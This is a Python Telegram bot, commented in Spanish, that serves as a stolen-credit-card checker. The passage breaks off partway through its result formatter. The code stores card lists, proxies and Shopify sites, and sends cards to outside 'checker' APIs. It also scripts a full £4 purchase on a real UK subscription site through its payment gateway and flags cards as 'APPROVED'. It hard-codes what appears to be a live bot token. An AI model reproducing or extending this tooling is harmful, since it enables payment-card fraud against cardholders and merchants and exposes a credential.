import telebot
from telebot import types
import requests
import sqlite3
import json
import time
import os
import re
import random
from datetime import datetime
from threading import Thread, Lock
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import socket
import html  # <-- SOLO AGREGUE ESTA LÍNEA (necesaria para el nuevo gateway)

# Configuración del bot - Usando variable de entorno para el token
TOKEN = os.environ.get('TOKEN', '8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE')
bot = telebot.TeleBot(TOKEN)

# Lock para operaciones de base de datos (para hilos)
db_lock = Lock()

# ==================== FUNCIONES DE BASE DE DATOS ====================

def get_db_connection():
    """Crea una nueva conexión a la base de datos"""
    conn = sqlite3.connect('proxies.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    """Inicializa la base de datos con todas las tablas necesarias"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Tabla de proxies
    cursor.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT,
        last_test TEXT,
        status TEXT DEFAULT 'untested'
    )''')
    
    # Tabla de historial
    cursor.execute('''CREATE TABLE IF NOT EXISTS historial (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT,
        proxy TEXT,
        gate TEXT,
        amount TEXT,
        status TEXT,
        message TEXT,
        gates TEXT,
        bin_info TEXT,
        fecha TEXT
    )''')
    
    # Tabla de tarjetas
    cursor.execute('''CREATE TABLE IF NOT EXISTS tarjetas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT UNIQUE,
        fecha TEXT,
        veces_verificada INTEGER DEFAULT 0
    )''')
    
    # Tabla para sitios Shopify
    cursor.execute('''CREATE TABLE IF NOT EXISTS sitios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT
    )''')
    
    # Agregar columnas si no existen
    try:
        cursor.execute("ALTER TABLE proxies ADD COLUMN last_test TEXT")
        cursor.execute("ALTER TABLE proxies ADD COLUMN status TEXT DEFAULT 'untested'")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN gate TEXT")
        cursor.execute("ALTER TABLE historial ADD COLUMN amount TEXT")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN bin_info TEXT")
    except:
        pass
    
    conn.commit()
    conn.close()
    print("✅ Base de datos configurada correctamente")

# Inicializar BD
init_database()

# Cola de tareas masivas
active_tasks = {}

# ==================== FUNCIONES DE PROXIES ====================

def guardar_proxy(proxy):
    """Guarda un proxy en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)", 
                      (proxy, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando proxy: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_proxies_desde_texto(texto):
    """Guarda proxies desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    # Patrón para identificar proxies (ip:puerto o ip:puerto:user:pass)
    patron_proxy = re.compile(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)(?::([^:]+):([^:]+))?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        # Verificar si es un proxy válido
        if patron_proxy.match(linea):
            try:
                cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_proxies():
    """Obtiene todos los proxies"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy FROM proxies")
    proxies = [row[0] for row in cursor.fetchall()]
    conn.close()
    return proxies

def obtener_proxies_con_estadisticas():
    """Obtiene proxies con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy, successes, failures, last_test, status FROM proxies ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_proxy(proxy):
    """Elimina un proxy específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_proxies():
    """Elimina TODOS los proxies de la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def eliminar_proxies_muertos():
    """Elimina todos los proxies marcados como 'dead'"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE status = 'dead'")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_proxy(proxy, success):
    """Actualiza estadísticas de un proxy"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE proxies SET {campo} = {campo} + 1, last_used = ? WHERE proxy = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

def actualizar_status_proxy(proxy, status, tiempo):
    """Actualiza el status del proxy después del test"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE proxies SET status = ?, last_test = ? WHERE proxy = ?",
                  (status, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

# ==================== FUNCIONES PARA SITIOS SHOPIFY ====================

def guardar_sitio(url):
    """Guarda un sitio Shopify en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)", 
                      (url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando sitio: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_sitios_desde_texto(texto):
    """Guarda sitios desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    # Patrón para identificar URLs de Shopify
    patron_url = re.compile(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        # Verificar si es una URL válida de Shopify
        if patron_url.match(linea):
            try:
                cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_sitios():
    """Obtiene todos los sitios Shopify"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM sitios")
    sitios = [row[0] for row in cursor.fetchall()]
    conn.close()
    return sitios

def obtener_sitios_con_estadisticas():
    """Obtiene sitios con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url, successes, failures, last_used FROM sitios ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_sitio(url):
    """Elimina un sitio específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios WHERE url = ?", (url,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_sitios():
    """Elimina TODOS los sitios de la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_sitio(url, success):
    """Actualiza estadísticas de un sitio"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE sitios SET {campo} = {campo} + 1, last_used = ? WHERE url = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
    conn.commit()
    conn.close()

# ==================== LIMPIEZA AUTOMÁTICA DE SITIOS ====================

def limpiar_sitios_muertos():
    """
    Elimina automáticamente los sitios que devuelven errores como 'py id empty'
    Solo mantiene sitios con respuestas útiles
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Obtener todos los sitios
    cursor.execute("SELECT id, url, failures FROM sitios")
    sitios = cursor.fetchall()
    
    eliminados = 0
    for sitio in sitios:
        sitio_id = sitio['id']
        url = sitio['url']
        failures = sitio['failures']
        
        # Verificar el sitio con una tarjeta de prueba
        try:
            # Usar una tarjeta de prueba que siempre dará decline
            cc_prueba = "4242424242424242|12|25|123"
            resultado = verificar_api_autoshopify(cc_prueba, url)
            
            # Respuestas que indican que el sitio SIRVE
            respuestas_utiles = [
                'Order completed',
                'Card declined',
                'insufficient funds',
                '3D Secure',
                'CAPTCHA_REQUIRED',
                'stripe error',
                'paypal error'
            ]
            
            # Respuestas que indican que el sitio NO SIRVE
            respuestas_muertas = [
                'py id empty',
                '404',
                'Not found',
                'Connection refused',
                'Timeout',
                'SSL error'
            ]
            
            mensaje = resultado.get('message', '').lower()
            
            # Si el mensaje contiene alguna respuesta muerta, eliminar el sitio
            if any(rm in mensaje for rm in [r.lower() for r in respuestas_muertas]):
                cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
                eliminados += 1
                print(f"🗑️ Sitio eliminado: {url} - Motivo: {resultado['message'][:50]}")
            
            # Si el sitio tiene demasiados failures, también eliminarlo
            elif failures >= 10:
                cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
                eliminados += 1
                print(f"🗑️ Sitio eliminado por muchos fallos: {url} - Failures: {failures}")
            
        except Exception as e:
            # Si hay error al verificar, también eliminar
            cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
            eliminados += 1
            print(f"🗑️ Sitio eliminado por excepción: {url} - Error: {str(e)[:50]}")
    
    conn.commit()
    conn.close()
    return eliminados

def limpiar_sitios_programado():
    """
    Función para ejecutar la limpieza cada cierto tiempo
    """
    while True:
        time.sleep(3600)  # Ejecutar cada hora
        try:
            eliminados = limpiar_sitios_muertos()
            if eliminados > 0:
                print(f"🧹 Limpieza automática: {eliminados} sitios eliminados")
        except Exception as e:
            print(f"❌ Error en limpieza programada: {e}")

# Iniciar el hilo de limpieza automática
limpieza_thread = Thread(target=limpiar_sitios_programado, daemon=True)
limpieza_thread.start()

# ==================== FUNCIONES DE TARJETAS ====================

def guardar_tarjetas_desde_texto(texto):
    """Guarda tarjetas desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardadas = 0
    repetidas = 0
    invalidas = 0
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        partes = linea.split('|')
        if len(partes) == 4:
            try:
                cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardadas += 1
            except:
                repetidas += 1
        else:
            invalidas += 1
    
    conn.close()
    return guardadas, repetidas, invalidas

def obtener_todas_tarjetas():
    """Obtiene todas las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT cc, fecha, veces_verificada FROM tarjetas ORDER BY fecha DESC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def aumentar_contador_tarjeta(cc):
    """Aumenta el contador de verificaciones de una tarjeta"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE tarjetas SET veces_verificada = veces_verificada + 1 WHERE cc = ?",
                  (cc,))
    conn.commit()
    conn.close()

def eliminar_tarjeta(cc):
    """Elimina una tarjeta específica"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas WHERE cc = ?", (cc,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todas_tarjetas():
    """Elimina TODAS las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def guardar_historial(cc, proxy, gate, amount, status, message, gates, bin_info):
    """Guarda una verificación en el historial"""
    if isinstance(bin_info, dict):
        bin_info_str = json.dumps(bin_info)
    else:
        bin_info_str = bin_info
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("INSERT INTO historial (cc, proxy, gate, amount, status, message, gates, bin_info, fecha) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                  (cc, proxy, gate, amount, status, message, gates, bin_info_str, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()
    
    if proxy != 'gestionado':
        actualizar_estadisticas_proxy(proxy, status == 'success')
    
    aumentar_contador_tarjeta(cc)

def obtener_estadisticas():
    """Obtiene estadísticas globales"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM proxies")
    stats_proxies = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM sitios")
    stats_sitios = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*) FROM tarjetas")
    total_tarjetas = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial")
    total_checks = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial WHERE status='success'")
    total_success = cursor.fetchone()[0]
    
    conn.close()
    
    return {
        'proxies': stats_proxies[0] or 0,
        'exits_proxy': stats_proxies[1] or 0,
        'fallos_proxy': stats_proxies[2] or 0,
        'sitios': stats_sitios[0] or 0,
        'exits_sitio': stats_sitios[1] or 0,
        'fallos_sitio': stats_sitios[2] or 0,
        'tarjetas': total_tarjetas or 0,
        'checks': total_checks or 0,
        'aprobadas': total_success or 0
    }

# ==================== FUNCIÓN DE CONSULTA BIN ====================

def consultar_bin(bin_number):
    """
    Consulta información de BIN usando binlist.net
    """
    try:
        bin_number = bin_number[:6]
        
        url = f"https://lookup.binlist.net/{bin_number}"
        headers = {
            'Accept-Version': '3',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            return response.json()
        elif response.status_code == 404:
            return {"error": "BIN no encontrado", "bin": bin_number}
        elif response.status_code == 429:
            return {"error": "Límite de peticiones excedido", "bin": bin_number}
        else:
            return {"error": f"Error {response.status_code}", "bin": bin_number}
            
    except Exception as e:
        return {"error": str(e), "bin": bin_number}

# ==================== FUNCIÓN DE VERIFICACIÓN STRIPE $1 NO AVS (GATE 5) ====================

def verificar_api_stripe_noavs(cc, proxy=None):
    """
    Verifica usando Stripe $1.00 No AVS (endpoint /api/check5) - Gate 5 de Samurai ApiHub
    Zero billing address requirement, máximo efficiency
    """
    try:
        api_url = f"https://samurai-api-hub.up.railway.app/api/check5?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates = data.get('gates', 'stripe 1.00$ charged (No AVS)')
            amount = data.get('amount', '1.00')
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates,
                'gate_name': 'Stripe $1 No AVS',
                'amount': amount,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'stripe error',
                'gate_name': 'Stripe $1 No AVS',
                'amount': '1.00',
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'stripe error',
            'gate_name': 'Stripe $1 No AVS',
            'amount': '1.00',
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIONES DE VERIFICACIÓN PAYPAL ====================

def verificar_api_paypal(cc, gate=1, proxy=None):
    """
    Verifica usando PayPal con diferentes montos
    gate 1: /pp/check  - $10.00
    gate 2: /pp/check2 - $0.10
    gate 3: /pp/check3 - $1.00
    """
    gates = {
        1: {"endpoint": "/pp/check", "amount": "10.00", "name": "PayPal $10"},
        2: {"endpoint": "/pp/check2", "amount": "0.10", "name": "PayPal $0.10"},
        3: {"endpoint": "/pp/check3", "amount": "1.00", "name": "PayPal $1"}
    }
    
    gate_info = gates.get(gate, gates[1])
    
    try:
        api_url = f"https://samurai-api-hub.up.railway.app{gate_info['endpoint']}?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates_str = f"paypal {gate_info['amount']}$ charged"
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates_str,
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'paypal error',
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'paypal error',
            'gate_name': gate_info['name'],
            'amount': gate_info['amount'],
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY CON NUEVA API ====================

def verificar_api_autoshopify(cc, url, proxy=None):
    """
    Verifica usando la NUEVA API de AutoShopify
    URL: https://auto-shopify-api-production.up.railway.app/index.php
    Parámetros: site, cc, proxy
    """
    try:
        # NUEVA URL DE LA API
        api_url = f"https://auto-shopify-api-production.up.railway.app/index.php?site={url}&cc={cc}"
        
        # Agregar proxy si está disponible
        if proxy:
            api_url += f"&proxy={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        # Intentar parsear la respuesta JSON
        try:
            data = response.json()
            
            # Extraer información de la respuesta
            response_text = data.get('Response', 'Unknown')
            price = data.get('Price', '0.00')
            gate = data.get('Gate', 'Shopify')
            
            # Determinar si es éxito
            is_success = 'Order completed' in response_text or 'success' in response_text.lower()
            
            return {
                'success': is_success,
                'status': 'success' if is_success else 'failed',
                'message': response_text,
                'gates': f"Shopify ${price}",
                'gate_name': f"AutoShopify ${price}",
                'amount': price,
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            # Si no es JSON, intentar con texto plano
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code} - {response.text[:100]}',
                'gates': 'shopify error',
                'gate_name': 'AutoShopify',
                'amount': '0.00',
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'shopify error',
            'gate_name': 'AutoShopify',
            'amount': '0.00',
            'url': url,
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== NUEVO GATEWAY: iSubscribe UK (£4.00) - AGREGADO SIN MODIFICAR NADA ====================

def capture(text, start_str, end_str):
    """Extrae texto entre dos marcadores - FUNCIÓN AUXILIAR PARA EL NUEVO GATEWAY"""
    try:
        start = text.find(start_str)
        if start == -1:
            return ""
        start += len(start_str)
        end = text.find(end_str, start)
        if end == -1:
            return ""
        return text[start:end].strip()
    except:
        return ""

def verificar_isubscribe(cc, proxy=None):
    """
    Verifica tarjeta comprando una suscripción en iSubscribe UK
    Monto: £4.00 GBP (~$4.00 USD)
    """
    start_time = time.time()
    session = requests.Session()
    
    # Configurar proxy si se proporciona
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, puerto, user, pwd = proxy_parts
            proxy_url = f'http://{user}:{pwd}@{ip}:{puerto}'
            session.proxies = {'http': proxy_url, 'https': proxy_url}
            proxy_used = proxy
        else:
            session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            proxy_used = proxy
    else:
        proxy_used = "gestionado"
    
    try:
        # Parsear tarjeta
        partes = cc.split('|')
        if len(partes) != 4:
            return {
                'success': False,
                'status': 'error',
                'message': 'Formato inválido',
                'gate_name': 'iSubscribe UK £4',
                'amount': '4.00',
                'proxy': proxy_used,
                'tiempo': round(time.time() - start_time, 2)
            }

        numero, mes, año, cvv = partes
        
        # Formatear mes y año
        if len(mes) == 1:
            mes = f'0{mes}'
        if len(año) == 2:
            año_full = f'20{año}'
            año_short = año
        else:
            año_full = año
            año_short = año[-2:]

        # Headers por defecto
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        # Determinar tipo de tarjeta
        if numero.startswith('3'):
            card_type = "AMEX"
        elif numero.startswith('4'):
            card_type = "VISA"
        elif numero.startswith('5'):
            card_type = "Mastercard"
        else:
            card_type = "VISA"

        # PASO 1: Obtener página del producto
        r = session.get("https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm", 
                       headers=headers, timeout=15)
        
        if r.status_code != 200:
            return {
                'success': False,
                'status': 'error',
                'message': f'Error HTTP {r.status_code}',
                'gate_name': 'iSubscribe UK £4',
                'amount': '4.00',
                'proxy': proxy_used,
                'tiempo': round(time.time() - start_time, 2)
            }
        
        # Extraer IDs del producto
        pi = capture(r.text, "prodId=", "&amp")
        ps = capture(r.text, "prodSubId=", "&amp")
        
        # PASO 2: Añadir al carrito
        session.get(f"https://www.isubscribe.co.uk/cart.cfm?action=add&prodId={pi}&prodSubId={ps}&qty=1", 
                   headers=headers, timeout=10)
        
        # PASO 3: Configurar datos de facturación
        email = f"test{random.randint(1000,9999)}@gmail.com"
        
        data_billing = (
            f"itemcount=1&guestcheckout=true&userid=&email={email}"
            f"&title=Mr.&firstname=John&lastname=Doe&phone=1234567890"
            f"&company=&street=1+Warwick+Road&suburb=Thames+Ditton"
            f"&postcode=KT7+0PR&state=&otherstate=&country=United+Kingdom"
            f"&prodsubid_1={ps}&prodtitle_1=She+Kicks+Magazine"
            f"&emaildelivery_1=0&isdigital_1=0&isgiftvoucher_1=0"
            f"&xmas_start_1=0&renewal_1=0&gift_1=0&senderfirstname_1=+"
            f"&email_1=&message_1=&senddate_1=18%2F10%2F2023&address_1=billing"
            f"&title_1=Mr.&firstname_1=John&lastname_1=Doe&company_1="
            f"&street_1=1+Warwick+Road&suburb_1=Thames+Ditton"
            f"&postcode_1=KT7+0PR&state_1=United+Kingfonm"
            f"&country_1=United+Kingdom&publisher_post=0&organisations_post=0"
            f"&isubscribe_terms=1"
        )
        
        headers_billing = headers.copy()
        headers_billing['Content-Type'] = 'application/x-www-form-urlencoded'
        
        session.post(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setbilling&formmode=new&ajax=true",
            headers=headers_billing,
            data=data_billing,
            timeout=15
        )
        
        # PASO 4: Seleccionar método de pago
        session.post(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setpayment&formmode=new&ajax=true",
            headers=headers_billing,
            data=f"paymentMethod=creditcard&walletToken=&card={card_type}",
            timeout=15
        )
        
        # PASO 5: Obtener página de confirmación
        r = session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=confirm", 
                       headers=headers, timeout=15)
        
        # Extraer tokens
        ft = capture(r.text, "fzToken = '", "'")
        ve = capture(r.text, '"verification" value="', '"')
        am = capture(r.text, "amount: ", ",")
        
        # PASO 6: Obtener CSRF token
        r = session.get("https://paynow.pmnts.io/sdk/bridge", headers=headers, timeout=15)
        cs = capture(r.text, "'X-CSRF-Token': \"", "\"")
        
        # PASO 7: Enviar datos de tarjeta
        headers_card = {
            "x-csrf-token": cs,
            "authorization": f"Bearer {ft}",
            "content-type": "application/json",
        }
        
        data_card = {
            "card_holder": "John Doe",
            "card_number": numero,
            "card_expiry": f"{mes}/{año_short}",
            "cvv": cvv,
        }
        
        r = session.post("https://paynow.pmnts.io/sdk/credit_cards", 
                        headers=headers_card, json=data_card, timeout=15)
        
        # PASO 8: Crear sesión SCA
        headers_sca = {
            "fz-merchant-username": "isubscribeunitedkingdom",
            "authorization": f"Bearer {ft}",
            "content-type": "application/json",
        }
        
        monto_int = int(am) if am and am.isdigit() else 400
        r = session.post("https://api.pmnts.io/sca/session", 
                        headers=headers_sca, 
                        json={"amount": monto_int, "currency": "GBP"},
                        timeout=15)
        
        # PASO 9: Procesar pago
        data_payment = (
            f"return_path=https%3A%2F%2Fwww.isubscribe.co.uk%2Fssl%2Fcheckout%2Findex.cfm%3Fview%3Dnew%26step%3Dconfirm%26mode%3Dadmin%26action%3DplaceOrder%26source%3Dconfirm"
            f"&verification={ve}&card_type={card_type}&card_number={numero}"
            f"&card_holder=John+Doe&expiry_month={mes}&expiry_year={año_short}"
            f"&cvv={cvv}"
        )
        
        r = session.post(
            "https://gateway.pmnts.io/v2/credit_cards/direct/isubscribeunitedkingdom",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data_payment,
            timeout=15,
            allow_redirects=False
        )
        
        # PASO 10: Verificar resultado - VERSIÓN CORREGIDA PARA EL MENSAJE DE ERROR
        r = session.get(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=returning&step=confirm&formmode=edit&source=confirm&error=true&errorno=05",
            headers=headers,
            timeout=15
        )
        
        # Extraer mensaje de error - CORREGIDO
        error_msg = "The transaction was declined, please check with the card issuer or use a different card."
        
        # Buscar el mensaje de error en diferentes formatos
        if "alert alert-danger" in r.text:
            # Patrón 1: Buscar el div de error
            msg_div = re.search(r'<div class="alert alert-danger[^>]*>(.*?)</div>', r.text, re.DOTALL)
            if msg_div:
                error_msg = html.unescape(msg_div.group(1))
                error_msg = re.sub(r'<[^>]+>', '', error_msg).strip()
        
        # Si no se encuentra, buscar el mensaje específico de declinación
        if error_msg == "The transaction was declined, please check with the card issuer or use a different card.":
            decline_patterns = [
                r'The transaction was declined[^<]*',
                r'Your card was declined[^<]*',
                r'Card declined[^<]*',
                r'insufficient funds[^<]*'
            ]
            for pattern in decline_patterns:
                match = re.search(pattern, r.text, re.IGNORECASE)
                if match:
                    error_msg = match.group(0)
                    break
        
        elapsed_time = time.time() - start_time
        
        # Determinar resultado
        if r.status_code == 302:
            status = "success"
            msg = "✅ CARGO EXITOSO de £4.00 GBP"
            success = True
        elif "insufficient funds" in error_msg.lower():
            status = "success"
            msg = "⚠️ Fondos insuficientes (tarjeta válida)"
            success = True
        else:
            status = "failed"
            msg = error_msg
            success = False
        
        return {
            'success': success,
            'status': status,
            'message': msg,
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(elapsed_time, 2)
        }
        
    except requests.exceptions.Timeout:
        return {
            'success': False,
            'status': 'error',
            'message': 'Timeout de conexión',
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }
    except requests.exceptions.ConnectionError:
        return {
            'success': False,
            'status': 'error',
            'message': 'Error de conexión',
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e)[:100],
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }

# ==================== FORMATO PREMIUM PARA RESULTADOS ====================

def formato_check_premium(cc, resultado_api, bin_info, tiempo, user_name="User", gate_type="Stripe"):
    """
    Formato premium con diseño tipo checker profesional
    """
    # Determinar estado de la verificación
    if resultado_api['status'] == 'success':
        estado_verif = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
        color_estado = "✅"
    elif resultado_api['status'] == 'failed':
        estado_verif = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        color_estado = "❌"
    elif resultado_api['status'] == 'error':
        estado_verif = "𝐄𝐫𝐫𝐨𝐫 ⚠️"
        color_estado = "⚠️"
    else:
        estado_verif = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ❓"
        color_estado = "❓"
    
    # Extraer datos de la tarjeta
    partes = cc.split('|')
    numero = partes[0]
    mes = partes[1]
    año = partes[2]
    cvv = partes[3]
    bin_num = numero[:6]
    
    # Extraer información del BIN
